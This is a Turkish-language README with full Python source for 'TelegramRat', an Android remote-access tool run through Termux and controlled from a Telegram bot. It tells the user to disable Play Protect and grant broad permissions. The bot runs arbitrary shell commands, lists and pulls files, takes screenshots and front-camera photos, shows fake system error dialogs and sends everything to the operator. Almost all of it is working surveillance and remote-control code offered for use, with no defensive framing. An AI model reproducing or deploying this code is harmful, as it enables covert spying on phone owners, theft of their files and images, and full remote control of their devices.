# TelegramRat
öncelikle termuxu f-droidten indirmeniz gerekiyor sonra termux api yi ve termux bootu 
eğer play protect hata verirse api ve bootu indirirken play store u açıp play protect kısmından güvenliği kapatmalısınız
termux, boot ve api için gerekli tüm izinleri vermelisiniz sistem ayarlayini degistirme arkaplanda pil tasarrufunu kapatma vs vs
sonra termuxu açın ve bu kodları girin

pkg update && pkg upgrade -y && pkg install termux-api 

pkg install proot python nano -y

pip install pyTelegramBotAPI

sonrasinda ise dosyalari kuaracaz 
dosyaları kurmak için kodlar ⬇️
cd storage && mkdir telegramrat
sonra telegramrat klasörüne girmemiz gerekiyor
cd telegramrat && mkdir rat.py
sonra
cd rat.py
nano rat.py
şimdi önünüze bir ekran açılmış olması lazım 
hicbirseye karismayip termuxu arkaplana alın ve telegrama girin
telegrama botfather yazin ve addbot kismindan bir bot oluşturun adını vesaire soracak istediğiniz sekilde adını girin sonra o bot fatherdan olusturdugunuz botun tokenini isteyin tokeni notlara kaydedin
sonra telegramda "userinfobot" yazin ve join to channel diyin sonra im joined diyin size sizin id inizi verecek ve o id de kopyalayip notlara yapistirin şimdi altta bir kod verecem ve ne yapmanız gerektiğini kodun altında belirtecem
----------------------
import telebot
import subprocess
import os
import time
import threading

# --- AYARLAR ---
API_TOKEN = 'burayı silip tokenini gir'
ADMIN_ID = burayı silip id ni gir eşittirden sonra boşluk olacak unutma

bot = telebot.TeleBot(API_TOKEN)
HOME = os.path.expanduser("~")
STORAGE = "/sdcard" if os.path.exists("/sdcard") else HOME
live_stream = False

def is_admin(message):
    return message.from_user.id == ADMIN_ID

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception as e:
        return f"Hata: {str(e)}"

# --- EKRAN YAKALAMA MOTORU ---
def capture_screen(path):
    if os.path.exists(path): os.remove(path)
    # Standart deneme
    subprocess.run(f"screencap -p {path}", shell=True)
    if os.path.exists(path) and os.path.getsize(path) > 0: return True
    # Alternatif sistem yolu
    subprocess.run(f"/system/bin/screencap -p {path}", shell=True)
    return os.path.exists(path) and os.path.getsize(path) > 0

# --- TARAYICI VE MEDYA ZORLAYICI ---
def open_url_forced(url):
    subprocess.run(f"termux-open '{url}'", shell=True)
    subprocess.run(f"am start -a android.intent.action.VIEW -d '{url}'", shell=True)

# --- ANA MENÜ ---
@bot.message_handler(func=is_admin, commands=['start', 'yardim'])
def send_welcome(message):
    menu = (
        "<b>🔱 v15.5 HYBRID ELITE AKTİF 🔱</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔊 <b>SES & ETKİLEŞİM</b>\n"
        "├ /ses [0-100] - Hassas Ses Ayarı\n"
        "├ /konus [metin] - Sesli Konuştur (TTS)\n"
        "├ /hata [mesaj] - Sahte Hata Kutusu\n"
        "└ /uyari [metin] - Toast Bildirimi\n\n"
        "🌐 <b>WEB & MEDYA</b>\n"
        "├ /ara [kelime] - Google'da Ara\n"
        "├ /muzik [url] - Şarkı/Video Aç\n"
        "└ /link [url] - Tarayıcıda Aç\n\n"
        "📸 <b>GÖRÜNTÜ & DONANIM</b>\n"
        "├ /ss - Ekran Yakala / /canli - Akış\n"
        "├ /flas_ac - /flas_kapat - Fener\n"
        "└ /foto - Ön Kamera Fotoğraf\n\n"
        "📂 <b>DOSYA SİSTEMİ</b>\n"
        "├ /ls [yol] - Listele / /indir [yol]\n"
        "├ /dosya_oku [yol] - /dosya_sil [yol]\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "💻 <code>/cmd [komut]</code> - Full Terminal"
    )
    bot.reply_to(message, menu, parse_mode="HTML")

# --- SES VE ETKİLEŞİM KOMUTLARI ---

@bot.message_handler(func=is_admin, commands=['ses'])
def set_volume(message):
    try:
        val = int(message.text.split()[1])
        if 0 <= val <= 100:
            # Android ses skalası 0-100 arasıdır
            android_vol = int((val / 100) * 100)
            run_cmd(f"termux-volume music {android_vol}")
            run_cmd(f"settings put system volume_ring {android_vol}")
            run_cmd(f"cmd media_session volume --set {android_vol}")
            bot.reply_to(message, f"🔊 Ses %{val} seviyesine çekildi.")
        else:
            bot.reply_to(message, "❌ 0-100 arası bir değer girin.")
    except:
        bot.reply_to(message, "❌ Kullanım: /ses 50")

@bot.message_handler(func=is_admin, commands=['konus'])
def tts_speak(message):
    text = message.text.replace("/konus ", "")
    if text != "/konus":
        run_cmd(f"termux-tts-speak '{text}'")
        bot.reply_to(message, "🗣️ Cihaz konuşturuluyor...")
    else:
        bot.reply_to(message, "❌ Kullanım: /konus Mesaj")

@bot.message_handler(func=is_admin, commands=['hata'])
def show_error(message):
    msg = message.text.replace("/hata ", "")
    run_cmd(f"termux-dialog confirm -t 'Sistem Hatası' -i '{msg}'")
    bot.reply_to(message, "⚠️ Hata kutusu gönderildi.")

@bot.message_handler(func=is_admin, commands=['uyari'])
def show_toast(message):
    msg = message.text.replace("/uyari ", "")
    run_cmd(f"termux-toast -c red -b white '{msg}'")
    bot.reply_to(message, "🎈 Bildirim gönderildi.")

# --- WEB VE MEDYA KOMUTLARI ---

@bot.message_handler(func=is_admin, commands=['ara'])
def google_search(message):
    try:
        query = message.text.split(maxsplit=1)[1].replace(" ", "+")
        open_url_forced(f"https://www.google.com/search?q={query}")
        bot.reply_to(message, f"🔍 '{query}' Google'da aratılıyor...")
    except:
        bot.reply_to(message, "❌ Kullanım: /ara kelime")

@bot.message_handler(func=is_admin, commands=['muzik', 'link'])
def play_media(message):
    try:
        url = message.text.split(maxsplit=1)[1]
        run_cmd("settings put system volume_music 100") # Açılışta sesi fulle
        open_url_forced(url)
        bot.reply_to(message, "🚀 Bağlantı açılıyor...")
    except:
        bot.reply_to(message, "❌ Kullanım: /muzik URL")

# --- GÖRÜNTÜ VE DONANIM ---

@bot.message_handler(func=is_admin, commands=['ss'])
def take_ss(message):
    p = os.path.join(HOME, "screen.png")
    if capture_screen(p):
        with open(p, "rb") as f: bot.send_photo(ADMIN_ID, f, caption="📸 Ekran Yakalandı.")
        os.remove(p)
    else:
        bot.reply_to(message, "❌ SS Başarısız. USB Güvenlik ayarlarını kontrol edin.")

@bot.message_handler(func=is_admin, commands=['flas_ac', 'flas_kapat'])
def flash_control(message):
    mode = "on" if "ac" in message.text else "off"
    run_cmd(f"termux-torch {mode}")
    bot.reply_to(message, f"🔦 Fener {mode}.")

@bot.message_handler(func=is_admin, commands=['foto'])
def take_photo(message):
    p = os.path.join(HOME, "camera.jpg")
    run_cmd(f"termux-camera-photo -c 1 {p}")
    if os.path.exists(p):
        with open(p, "rb") as f: bot.send_photo(ADMIN_ID, f, caption="📸 Ön Kamera")
        os.remove(p)

# --- DOSYA VE SİSTEM ---

@bot.message_handler(func=is_admin, commands=['ls'])
def list_files(message):
    path = message.text.replace("/ls ", "")
    if path == "/ls": path = STORAGE
    res = run_cmd(f"ls -F '{path}'")
    bot.reply_to(message, f"📂 <b>Dizin:</b> {path}\n\n<code>{res[:3500]}</code>", parse_mode="HTML")

@bot.message_handler(func=is_admin, commands=['indir'])
def download_file(message):
    path = message.text.replace("/indir ", "")
    if os.path.exists(path) and os.path.isfile(path):
        with open(path, "rb") as f: bot.send_document(ADMIN_ID, f)
    else:
        bot.reply_to(message, "❌ Dosya bulunamadı.")

@bot.message_handler(func=is_admin, commands=['cmd'])
def shell(message):
    cmd = message.text.replace("/cmd ", "")
    bot.reply_to(message, f"💻 Çıktı:\n<code>{run_cmd(cmd)[:3500]}</code>", parse_mode="HTML")

# --- DÖNGÜ ---
print("🔱 v15.5 HYBRID ELITE AKTİF! Her şey hazır.")
while True:
    try:
        bot.polling(none_stop=True, interval=1, timeout=30)
    except:
        time.sleep(5)
 ------------------------------------      
şimdi bu kodların en üst kısmında token ve id var olusturdugun botun tokenini o tırnak içerisindeki yazilari silip yapıştır 
diğer aldigimiz id yi de id kismina esittir ile arasında bir boşluk olacak sekilde yapıştır sonra klavyenin sol üst kısmında
ctrl var ctrl ye basıp klavyeden o tuşuna bas kaydetmis olursun sonra ctrl ve x tuşuna basıp çık ve terminal geri geldi
şimdi kodu aşağıdaki kod ile calistiralim 

python rat.py 

15.5 hybdrid aktif yazıyorsa kod çalışmıştır devamında ise telegramdan botunuza girerek botunuza /start komutunu verip kullanabilirsiniz 
